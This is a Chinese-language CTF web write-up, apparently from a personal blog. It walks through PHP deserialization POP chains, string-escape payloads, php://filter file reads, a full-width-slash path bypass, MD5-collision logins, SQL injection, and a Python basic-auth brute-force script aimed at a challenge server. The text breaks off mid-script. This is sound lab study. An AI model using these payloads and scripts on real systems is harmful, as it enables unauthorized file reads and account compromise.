+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">lemon</span></span>&#123;</span><br><span class="line">    <span class="keyword">protected</span> <span class="variable">$ClassObj</span>;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span>&#123;<span class="variable language_">$this</span>-&gt;ClassObj = <span class="keyword">new</span> <span class="title function_ invoke__">normal</span>();&#125;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>)</span>&#123;<span class="variable language_">$this</span>-&gt;ClassObj-&gt;<span class="title function_ invoke__">action</span>();&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">normal</span></span>&#123;</span><br><span class="line">	<span class="function"><span class="keyword">function</span> <span class="title">action</span>(<span class="params"></span>)</span>&#123;<span class="keyword">echo</span> <span class="string">&quot;&lt;img src=\&quot;haha.png\&quot; alt=\&quot;\&quot;&gt;&quot;</span>;&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">evil</span></span>&#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$data</span>;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">action</span>(<span class="params"></span>)</span>&#123;<span class="title function_ invoke__">show_source</span>(<span class="string">&quot;flag.php&quot;</span>);&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;d&#x27;</span>]))&#123;<span class="title function_ invoke__">unserialize</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;d&#x27;</span>])；&#125;</span><br><span class="line"><span class="keyword">else</span>&#123;<span class="variable">$stack</span>=<span class="keyword">new</span> <span class="title function_ invoke__">lemon</span>()；&#125;</span><br></pre></td></tr></table></figure>
+
+<ol>
+<li>接收get参数d，利用unserialize进行反序列化</li>
+<li>flag在flag.php，需要触发evil类中的action方法</li>
+</ol>
+<p>将构造函数中的<code>new normal()</code>改为<code>new evil()</code>，构造lemon类的序列化数据，输出base64编码是为了避免复制粘贴遗漏一些不可识别的字符</p>
+<p><img src="http://hexo-git.oss-cn-beijing.aliyuncs.com/img/image-20231007153027631.png" alt="image-20231007153027631"></p>
+<p>利用hackbar解码后作为参数d的值，访问得到flag</p>
+<p><img src="http://hexo-git.oss-cn-beijing.aliyuncs.com/img/image-20231007153312177.png" alt="image-20231007153312177"></p>
+<h3 id="command-injection"><a href="#command-injection" class="headerlink" title="command-injection"></a>command-injection</h3><p>查看前端源码，存在提示：<code>include.php</code>，访问<code>/include.php</code>有重定向，查看网络请求可以看到参数为file。</p>
+<p><img src="http://hexo-git.oss-cn-beijing.aliyuncs.com/img/image-20231007154138394.png" alt="image-20231007154138394"></p>
+<p>修改file参数后没有回显，但是响应头中有提示：<code>tips=createfun.php</code>，根据前面的<code>file=index</code>猜测应该是会自动添加php后缀，利用php伪协议读取源码：<code>file=php://filter/read=convert.base64-encode/resource=createfun</code>，用相同的方法可以读取include.php的源码</p>
+<p><img src="http://hexo-git.oss-cn-beijing.aliyuncs.com/img/image-20231007155527098.png" alt="image-20231007155527098"></p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$func</span> = @<span class="variable">$_GET</span>[<span class="string">&#x27;func&#x27;</span>];</span><br><span class="line"><span class="variable">$arg</span> = @<span class="variable">$_GET</span>[<span class="string">&#x27;arg&#x27;</span>];</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$func</span>)&amp;&amp;<span class="keyword">isset</span>(<span class="variable">$arg</span>))&#123;<span class="variable">$func</span>(<span class="variable">$arg</span>,<span class="string">&#x27;&#x27;</span>);&#125;</span><br></pre></td></tr></table></figure>
+
+<p>存在命令注入漏洞，<strong>想了很久的构造命令执行，结果是show_source，至于为什么猜flag.php，include.php的过滤部分特地过滤了flag</strong></p>
+<p><img src="http://hexo-git.oss-cn-beijing.aliyuncs.com/img/image-20231007161840579.png" alt="image-20231007161840579"></p>
+<p>总结：文件包含、php伪协议、php命令注入</p>
+<h3 id="逃逸"><a href="#逃逸" class="headerlink" title="逃逸"></a>逃逸</h3><p>代码审计：</p>
+<ol>
+<li>获取get参数a和b，作为A类构造函数的参数</li>
+<li>serialize与unserialize间存在字符串过滤，存在反序列化字符逃逸，原理参考<a target="_blank" rel="noopener" href="https://blog.csdn.net/qq_45521281/article/details/107135706">PHP反序列化字符逃逸详解_php filter字符串溢出-CSDN博客</a></li>
+<li>B类的析构函数存在echo，通过一定的构造能够触发C类中的<code>__toString</code>方法</li>
+<li>获取flag需要令C类中的变量c为flag.php</li>
+</ol>
+<p>构造payload（控制pop链和序列化后字符串的长度</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">filter_nohack</span>(<span class="params"><span class="variable">$data</span></span>) </span>&#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="title function_ invoke__">str_replace</span>(<span class="string">&#x27;flag&#x27;</span>, <span class="string">&#x27;&#x27;</span>, <span class="variable">$data</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">A</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$username</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$password</span>;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$a</span>, <span class="variable">$b</span></span>)</span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;username = <span class="variable">$a</span>;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;password = <span class="variable">$b</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">B</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$b</span>;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;b = <span class="keyword">new</span> <span class="title function_ invoke__">C</span>();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">C</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$c</span> = <span class="string">&quot;flflagag.php&quot;</span>;<span class="comment">//双写绕过</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">serialize</span>(<span class="keyword">new</span> <span class="title function_ invoke__">B</span>());</span><br><span class="line"><span class="comment">// O:1:&quot;B&quot;:1:&#123;s:1:&quot;b&quot;;O:1:&quot;C&quot;:1:&#123;s:1:&quot;c&quot;;s:12:&quot;flflagag.php&quot;;&#125;&#125;</span></span><br><span class="line"></span><br><span class="line"><span class="variable">$a</span> = <span class="string">&#x27;flagflagflagflagflagflag&#x27;</span>;</span><br><span class="line"><span class="variable">$b</span> = <span class="string">&#x27;1&quot;;s:8:&quot;password&quot;;O:1:&quot;B&quot;:1:&#123;s:1:&quot;b&quot;;O:1:&quot;C&quot;:1:&#123;s:1:&quot;c&quot;;s:8:&quot;fflaglag.php&quot;;&#125;&#125;;&#125;&#x27;</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">filter_nohack</span>(<span class="title function_ invoke__">serialize</span>(<span class="keyword">new</span> <span class="title function_ invoke__">A</span>(<span class="variable">$a</span>,<span class="variable">$b</span>)));</span><br><span class="line"><span class="comment">// O:1:&quot;A&quot;:2:&#123;s:8:&quot;username&quot;;s:24:&quot;&quot;;s:8:&quot;password&quot;;s:79:&quot;1&quot;;s:8:&quot;password&quot;;O:1:&quot;B&quot;:1:&#123;s:1:&quot;b&quot;;O:1:&quot;C&quot;:1:&#123;s:1:&quot;c&quot;;s:8:&quot;flag.php&quot;;&#125;&#125;;&#125;&quot;;&#125;</span></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p><img src="http://hexo-git.oss-cn-beijing.aliyuncs.com/img/image-20231007180733118.png" alt="image-20231007180733118"></p>
+<p><img src="http://hexo-git.oss-cn-beijing.aliyuncs.com/img/image-20231007174242405.png" alt="image-20231007174242405"></p>
+<p>总结：php反序列化pop链和字符逃逸</p>
+<h2 id="08"><a href="#08" class="headerlink" title="08"></a>08</h2><h3 id="Make-Me-Cry"><a href="#Make-Me-Cry" class="headerlink" title="Make Me Cry"></a>Make Me Cry</h3><p>页面提示访问&#x2F;flag，访问后提示使用POST请求并传递文件名</p>
+<p>抓包修改请求方式并添加请求体内容，尝试访问以下文件：</p>
+<ul>
+<li>main：可执行的二进制文件</li>
+<li>main.cr：源码</li>
+<li>test.txt：测试文件，表示可以正常读取</li>
+<li>flag：无法直接访问，有过滤</li>
+</ul>
+<p>审计main.cr，crystal语言</p>
+<figure class="highlight crystal"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">context.response.content_type = <span class="string">&quot;text/plain; charset=utf-8&quot;</span></span><br><span class="line"><span class="keyword">if</span> context.request.path == <span class="string">&quot;/flag&quot;</span></span><br><span class="line">    <span class="keyword">if</span> context.request.method == <span class="string">&quot;POST&quot;</span></span><br><span class="line">        <span class="keyword">begin</span></span><br><span class="line">            <span class="comment"># 获取POST请求体中的所有内容</span></span><br><span class="line">            filename = context.request.body.not_nil!.gets_to_end</span><br><span class="line">            filename = File.basename filename	<span class="comment"># 获取文件名，去除目录、后缀等</span></span><br><span class="line">            filename = normalize filename	<span class="comment"># 全角转半角符号</span></span><br><span class="line">            <span class="keyword">if</span> File.match?(<span class="string">&quot;*fl*&quot;</span>, filename) <span class="comment"># 正则匹配是否包含fl子串</span></span><br><span class="line">                context.response.print <span class="string">&quot;You can&#x27;t get flag directly&quot;</span>  </span><br><span class="line">            <span class="keyword">else</span></span><br><span class="line">                data = File.read(filename)	<span class="comment"># 读取文件内容并返回</span></span><br><span class="line">                context.response.print data</span><br><span class="line"><span class="comment"># ...</span></span><br></pre></td></tr></table></figure>
+
+<ul>
+<li><strong><code>File.basename</code>不会将全角的斜杠识别为目录路径</strong></li>
+<li><strong>正则表达式中的<code>*</code>匹配无限数量的任意字符，不包括 &#x2F;</strong></li>
+</ul>
+<p>payload为<code>/.／flag</code>，第二个斜杠为全角符号，用在线工具查看处理过程：</p>
+<p><img src="http://hexo-git.oss-cn-beijing.aliyuncs.com/img/image-20231009133458515.png" alt="image-20231009133458515"></p>
+<p>burp修改请求包为POST，添加请求体为<code>/.／flag</code></p>
+<p><img src="http://hexo-git.oss-cn-beijing.aliyuncs.com/img/image-20231009133649987.png" alt="image-20231009133649987"></p>
+<h2 id="09"><a href="#09" class="headerlink" title="09"></a>09</h2><h3 id="ezlogin"><a href="#ezlogin" class="headerlink" title="*ezlogin"></a>*ezlogin</h3><p>前端源码有提示，md5碰撞，username和password的值不一样但是md5值一样</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (<span class="title function_ invoke__">md5</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;username&#x27;</span>]) === <span class="title function_ invoke__">md5</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;password&#x27;</span>])) + <span class="keyword">if</span> (<span class="variable">$_GET</span>[<span class="string">&#x27;username&#x27;</span>] == <span class="variable">$_GET</span>[<span class="string">&#x27;password&#x27;</span>]) </span><br></pre></td></tr></table></figure>
+
+<p><a target="_blank" rel="noopener" href="https://github.com/iamjazz/Md5collision">https://github.com/iamjazz/Md5collision</a> 生成md5碰撞值，具体步骤见工具的readme</p>
+<p><img src="http://hexo-git.oss-cn-beijing.aliyuncs.com/img/image-20231009141512914.png" alt="image-20231009141512914"></p>
+<p><strong>另一个思路是利用md5加密的漏洞</strong>：md5不能加密数组，传入数组返回null</p>
+<p>跳转到新页面setu.php，url参数存在file&#x3D;setu，猜测文件包含，并且会添加php后缀。尝试php伪协议读取setu.php</p>
+<p><img src="http://hexo-git.oss-cn-beijing.aliyuncs.com/img/image-20231009145104978.png" alt="image-20231009145104978"></p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    <span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line">        <span class="keyword">if</span> ( <span class="keyword">isset</span>( <span class="variable">$_GET</span>[<span class="string">&#x27;file&#x27;</span>] ) ) &#123;</span><br><span class="line">            <span class="variable">$str</span> = <span class="title function_ invoke__">str_replace</span>(<span class="string">&quot;../&quot;</span>,<span class="string">&quot;&quot;</span>,<span class="variable">$_GET</span>[<span class="string">&#x27;file&#x27;</span>]); </span><br><span class="line"></span><br><span class="line">            <span class="keyword">if</span> (<span class="title function_ invoke__">strpos</span>(<span class="variable">$str</span>,<span class="string">&#x27;php://filter/convert.base64-encode/resource&#x27;</span>) !== <span class="literal">false</span>) &#123;</span><br><span class="line">                <span class="keyword">include</span> ( <span class="variable">$_GET</span>[<span class="string">&#x27;file&#x27;</span>] . <span class="string">&#x27;.php&#x27;</span>);</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">else</span> &#123;</span><br><span class="line">                <span class="keyword">include</span>( <span class="string">&quot;/var/www/html/&quot;</span> . <span class="variable">$str</span> . <span class="string">&#x27;.php&#x27;</span> );</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="title function_ invoke__">header</span>(<span class="string">&quot;Location: setu.php?file=setu&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    <span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p>用御剑进行目录扫描，存在hint.php，仍用php伪协议读取。获取部分flag，提示&#x2F;answer，不是访问路径，应该是某个目录，结合setu.php中过滤了<code>../</code>，猜测是<code>../answer</code>目录</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="comment">/* Rewards for u:</span></span><br><span class="line"><span class="comment">	NUAACTF&#123;H3ll0_</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">  Hint: Can u see my filter?</span></span><br><span class="line"><span class="comment">		I put something in /answer </span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line">	<span class="keyword">echo</span> <span class="string">&quot;Wuhu!&quot;</span>;</span><br><span class="line"><span class="meta">?&gt;</span> </span><br></pre></td></tr></table></figure>
+
+<p>双写绕过str_replace过滤，但是不知道文件名啊，好像是比赛时跟平台的环境不一样？有别的提示？</p>
+<p>总结：php伪协议、md5加密漏洞</p>
+<h3 id="loginjection"><a href="#loginjection" class="headerlink" title="*loginjection"></a>*loginjection</h3><p>单引号返回hack！fuzz测试特殊符号，结果<code>#-&#39;</code>这三个符号被过滤，一看就是sql注入。</p>
+<p>看着源码都注不动：<a target="_blank" rel="noopener" href="https://github.com/Asuri-Team/NUAACTF2022-Challenges/blob/main/web/loginjection/deployment/html/index.php">https://github.com/Asuri-Team/NUAACTF2022-Challenges/blob/main/web/loginjection/deployment/html/index.php</a></p>
+<p>用&#x2F;*作为注释符，id参数不用单引号闭合，但就是注不了，返回不了数据，wp说有admin，而且他没用注释？<a target="_blank" rel="noopener" href="https://github.com/Asuri-Team/NUAACTF2022-Challenges/blob/main/web/NUAACTF-2022-Web.pdf">https://github.com/Asuri-Team/NUAACTF2022-Challenges/blob/main/web/NUAACTF-2022-Web.pdf</a></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">id=-1 or 1=1 order by 10/*&amp;username=2&amp;password=3</span><br></pre></td></tr></table></figure>
+
+<p>总结：sqllit3盲注</p>
+<h3 id="superpop"><a href="#superpop" class="headerlink" title="superpop"></a>superpop</h3><p>一眼反序列化pop链，但是随便访问一下&#x2F;flag路径就get到了flag……</p>
+<ul>
+<li>当以函数的形式去调用对象(类)的时候触发<code>_invoke</code></li>
+<li>读取不可访问属性的值时触发<code>__get</code></li>
+</ul>
+<p>构造pop链 from: <a target="_blank" rel="noopener" href="https://github.com/Asuri-Team/NUAACTF2022-Challenges/blob/main/web/NUAACTF-2022-Web.pdf">https://github.com/Asuri-Team/NUAACTF2022-Challenges/blob/main/web/NUAACTF-2022-Web.pdf</a></p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"> <span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">User</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$username</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$password</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$variable</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$a</span>;   </span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Login</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$point</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Read</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$filename</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$read</span> = <span class="keyword">new</span> <span class="title class_">Read</span>();</span><br><span class="line"><span class="variable">$user</span> = <span class="keyword">new</span> <span class="title class_">User</span>();</span><br><span class="line"><span class="variable">$login</span> = <span class="keyword">new</span> <span class="title class_">Login</span>();</span><br><span class="line"><span class="comment">// 利用md5加密漏洞，满足User的__wakeup中的if条件</span></span><br><span class="line"><span class="variable">$a</span> = <span class="keyword">array</span>(<span class="string">&quot;1&quot;</span>);</span><br><span class="line"><span class="variable">$b</span> = <span class="keyword">array</span>(<span class="string">&quot;2&quot;</span>);</span><br><span class="line"><span class="variable">$user</span>-&gt;username = <span class="variable">$a</span>;</span><br><span class="line"><span class="variable">$user</span>-&gt;password = <span class="variable">$b</span>;</span><br><span class="line"></span><br><span class="line"><span class="variable">$read</span>-&gt;filename = <span class="string">&quot;php://filter/convert.base64-encode/resource=flag&quot;</span>;</span><br><span class="line"><span class="variable">$login</span>-&gt;point = <span class="variable">$read</span>;<span class="comment">//使Login的__get方法中的$func()能触发Read中的__invoke</span></span><br><span class="line"><span class="variable">$user</span>-&gt;variable = <span class="variable">$login</span>;<span class="comment">//使User的__wakeup方法中的$this-&gt;variable-&gt;xxx能触发Login中的__get</span></span><br><span class="line"><span class="keyword">echo</span>(<span class="title function_ invoke__">urlencode</span>(<span class="title function_ invoke__">serialize</span>(<span class="variable">$user</span>)));</span><br><span class="line"><span class="meta">?&gt;</span> </span><br></pre></td></tr></table></figure>
+
+<h3 id="UnsafeDefenseSystem"><a href="#UnsafeDefenseSystem" class="headerlink" title="*UnsafeDefenseSystem"></a>*UnsafeDefenseSystem</h3><p>首页403，应该涉及越权？</p>
+<p>根据提示访问&#x2F;public，进一步提示.&#x2F;log.txt和&#x2F;public&#x2F;test</p>
+<p><img src="http://hexo-git.oss-cn-beijing.aliyuncs.com/img/image-20231009231121091.png" alt="image-20231009231121091"></p>
+<p>扫描&#x2F;public目录能得到index.php</p>
+<p>&#x2F;public&#x2F;test：一个静态页面，在前端源码中搜索一些关键信息，如flag、hint、php，找到登录后台：&#x2F;public&#x2F;nationalsb&#x2F;login.php，任意用户名密码可进，请求头Authorization为用户名密码的base64编码。</p>
+<p><img src="http://hexo-git.oss-cn-beijing.aliyuncs.com/img/image-20231009233115828.png" alt="image-20231009233115828"></p>
+<p>查看新路径：&#x2F;public&#x2F;nationalsb&#x2F;，又到了登录界面，script.js中存在敏感信息</p>
+<p><img src="http://hexo-git.oss-cn-beijing.aliyuncs.com/img/image-20231009233621488.png" alt="image-20231009233621488"></p>
+<p>此页面不可登录，应该是用这些信息去刚才的login.php登录，最后4位需要爆破，登录脚本如下：</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"><span class="keyword">from</span> requests.auth <span class="keyword">import</span> HTTPBasicAuth</span><br><span class="line"></span><br><span class="line">url = <span class="string">&quot;http://82.157.146.43:11089/public/nationalsb/login.php&quot;</span></span><br><span class="line">username = <span class="string">&quot;Admin1964752&quot;</span></span><br><span class="line">password = <span class="string">&quot;DsaPPPP!@#amspe&quot;</span></span><br><span class="line">nums = <span class="string">&quot;0123456789&quot;</span></span><br><span class="line"><span class="keyword">for</span> a <span class="keyword">in</span> nums:</span><br><span class="line">    <span class="keyword">for</span> b <span class="keyword">in</span> nums:</span><br><span class="line">        <span class="keyword">for</span> c <span class="keyword">in</span> nums:</span><br><span class="line">            <span class="keyword">for</span> d <span class="keyword">in</span> nums:</span><br><span class="line">                suffix = a+b+c+d</span><br><span class="line">                s = username+<span class="string">&quot;:&quot;</span>+password+suffix</span><br><span class="line">                resp = requests.get(url=url,auth=HTTPBasicAuth(username, password+suffix))</span><br><span class="line">                <span class="built_in">print</span>(suffix)</span><br><span class="line">                <span class="keyword">if</span> <span class="built_in">len</span>(resp.text)!=<span class="number">81</span>:	<span class="comment"># 请求失败的返回长度不会变</span></span><br><span class="line">                    <span class="built_in">print</span>(resp.text)                  </span><br><span class="line">                    exit(<span class="number">0</span>)</span><br></pre></td></tr></table></figure>
+
+<p>爆破结果为1221，得到提示存在文件包含。</p>
+<p><img src="http://hexo-git.oss-cn-beijing.aliyuncs.com/img/image-20231010134320326.png" alt="image-20231010134320326"></p>
+<p>尝试&#x2F;etc&#x2F;passwd可行，但是有些文件名有过滤。读取index.php，知道是thinkphp框架以及一些新的目录，联想到thinkphp5的rce漏洞。</p>
+<p><img src="http://hexo-git.oss-cn-beijing.aliyuncs.com/img/image-20231010135736236.png" alt="image-20231010135736236"></p>
+<p>根据新路径读取<code>../../thinkphp/start.php</code>，进一步读取base.php，得到thinkphp版本5.0.24</p>
+<p><img src="http://hexo-git.oss-cn-beijing.aliyuncs.com/img/image-20231010145039155.png" alt="image-20231010145039155"></p>
+<p>&#x2F;public&#x2F;log.txt：出现system error爆出ThinkPHP版本。（正常环境不应该这样</p>
+<p><a target="_blank" rel="noopener" href="https://www.jianshu.com/p/a4efbcb94df0">SCTF2020 wp - 简书 (jianshu.com)</a></p>
+<p>总结：敏感信息泄露，密码爆破，文件包含，条件竞争，thinkphp5，HTTPBasicAuth</p>
+<h2 id="10"><a href="#10" class="headerlink" title="10"></a>10</h2><h3 id="Jsonhub"><a href="#Jsonhub" class="headerlink" title="*Jsonhub"></a>*Jsonhub</h3><p>Django框架，开了debug模式。泄露存在的路径，尝试访问</p>
+<ul>
+<li>admin：重定向到登录&#x2F;admin&#x2F;login&#x2F;?next&#x3D;&#x2F;admin&#x2F;，有csrftoken，需要username和password，大小写敏感，暂未发现sql注入</li>
+<li>reg：有隐藏的登录框和admin</li>
+<li>login：</li>
+<li>home：被重定向到login</li>
+<li>rpc：报错Must 127.0.0.1，有ssrf？</li>
+</ul>
+<p>Django参数注入？？？下一个</p>
+<h3 id="fumo-backdoor"><a href="#fumo-backdoor" class="headerlink" title="**fumo backdoor"></a>**fumo backdoor</h3><p>看起来是反序列化，代码审计：</p>
+<ul>
+<li>__sleep方法中存在文件包含 <code>readfile</code>，但是有正则过滤。（serialize触发</li>
+<li>__wakeup方法中存在命令执行 <code>call_user_func</code>和新建类</li>
+</ul>
+<p>涉及imagick、session，<a target="_blank" rel="noopener" href="https://www.xiinnn.com/posts/2023sctf-fumo_backdoor/">2023SCTF fumo_backdoor - Lxxx (xiinnn.com)</a></p>
+<p>暂时略过</p>
+<h3 id="全球最大交友网站"><a href="#全球最大交友网站" class="headerlink" title="全球最大交友网站"></a>全球最大交友网站</h3><p>下载a.zip，是.git文件，联想到git泄露。</p>
+<p>在.git所在目录使用git命令查看日志：<code>git log</code></p>
+<p><img src="http://hexo-git.oss-cn-beijing.aliyuncs.com/img/image-20231010193537849.png" alt="image-20231010193537849"></p>
+<p>查看hint所在的提交记录：<code>git show 6b21737</code>，有一个flag，但是是假的，提示<code>Allsource files areingit tag1.0</code>。</p>
+<p><img src="http://hexo-git.oss-cn-beijing.aliyuncs.com/img/image-20231010194020260.png" alt="image-20231010194020260"></p>
+<p>查看hello所在的提交记录，也就是tag1.0，找到对的flag。</p>
+<p><img src="http://hexo-git.oss-cn-beijing.aliyuncs.com/img/image-20231010194355866.png" alt="image-20231010194355866"></p>
+<h3 id="小绿草之最强大脑"><a href="#小绿草之最强大脑" class="headerlink" title="小绿草之最强大脑"></a>小绿草之最强大脑</h3><p>前端源码提示：有源码泄露。御剑扫描存在index.php.bak，下载得到index.php的部分后端处理代码，代码审计：</p>
+<ul>
+<li>会对输入进行intval处理</li>
+<li>对计算所需时间有要求，在1-2s之间（提示大于21位的数字</li>
+<li>每次返回的计算内容不一样</li>
+<li><code>$_SESSION[&#39;count&#39;]++;</code>猜测可能与回答正确的次数有关</li>
+</ul>
+<p>构造python脚本进行反复尝试</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">from</span> bs4 <span class="keyword">import</span> BeautifulSoup</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"></span><br><span class="line">session = requests.session()</span><br><span class="line"></span><br><span class="line">burp0_url = <span class="string">&quot;http://82.157.146.43:10685/&quot;</span></span><br><span 